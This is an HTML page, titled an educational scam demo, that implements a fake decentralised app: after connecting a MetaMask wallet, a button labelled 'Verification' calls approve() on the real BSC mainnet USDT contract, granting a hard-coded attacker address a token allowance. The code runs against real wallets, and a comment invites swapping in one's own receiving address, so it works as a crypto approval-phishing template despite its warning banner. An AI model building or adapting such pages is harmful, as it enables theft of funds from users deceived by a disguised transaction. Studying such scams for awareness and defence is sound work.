<!DOCTYPE html>
<html>
<head>
    <title>üö® SCAM DEMO (Educational Only)</title>
    <!-- PROPERLY LOAD ethers.js from scammer's URL -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body { font-family: Arial; max-width: 600px; margin: 20px auto; }
        button { padding: 10px; background: #ff0000; color: white; border: none; cursor: pointer; }
        #status { margin-top: 20px; padding: 10px; background: #f0f0f0; }
    </style>
</head>
<body>
    <h1>üö® Fake DApp (Educational Scam Demo)</h1>
    <p><strong>‚ö†Ô∏è WARNING: This is a controlled demo. Never run untrusted code.</strong></p>
    
    <button onclick="connectWallet()">1. Connect Wallet</button>
    <button onclick="maliciousApproval()" id="approveBtn" disabled>2. Start "Verification"</button>
    
    <div id="walletInfo">Wallet: Not connected</div>
    <div id="status">Status: Waiting...</div>

    <script>
        // ‚úÖ ethers should now be defined
        console.log("ethers loaded?", typeof ethers !== "undefined"); 
        
        let walletAddress = "";
        let provider, signer;

        // üî• ATTACKER'S BSC WALLET (REPLACE WITH YOUR WALLET B ADDRESS)
        const ATTACKER_ADDRESS = "0xCE1EA0e930BF7244a90696056401E6702fe0f390"; 

        // USDT (BEP-20) Contract on BSC Mainnet
        const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
        const USDT_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];

        async function connectWallet() {
            if (!window.ethereum) {
                alert("MetaMask not installed!");
                return;
            }
            try {
                await window.ethereum.request({ method: "eth_requestAccounts" });
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                walletAddress = await signer.getAddress();
                document.getElementById("walletInfo").innerText = `Connected: ${walletAddress}`;
                document.getElementById("approveBtn").disabled = false;
                document.getElementById("status").innerText = "‚úÖ Wallet connected. Click 'Verification' to simulate malicious approval.";
            } catch (err) {
                alert("Error: " + err.message);
            }
        }

        async function maliciousApproval() {
            if (!walletAddress) {
                alert("Connect wallet first!");
                return;
            }

            // Small amount for demo (2 USDT)
            const amount = ethers.utils.parseUnits("2", 18);

            try {
                const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
                const tx = await usdtContract.approve(ATTACKER_ADDRESS, amount);
                document.getElementById("status").innerHTML = `‚è≥ <strong>Broadcasting approval...</strong><br>Check MetaMask.`;
                
                await tx.wait();
                document.getElementById("status").innerHTML = `
                    ‚úÖ <strong>Demo Complete!</strong><br>
                    Wallet <code>${walletAddress}</code> approved <strong>2 USDT</strong> for attacker (<code>${ATTACKER_ADDRESS}</code>).<br>
                    <strong>Funds were NOT auto-drained in this demo.</strong>
                `;
            } catch (err) {
                document.getElementById("status").innerText = "‚ùå Error: " + err.message;
            }
        }
    </script>
</body>
</html>
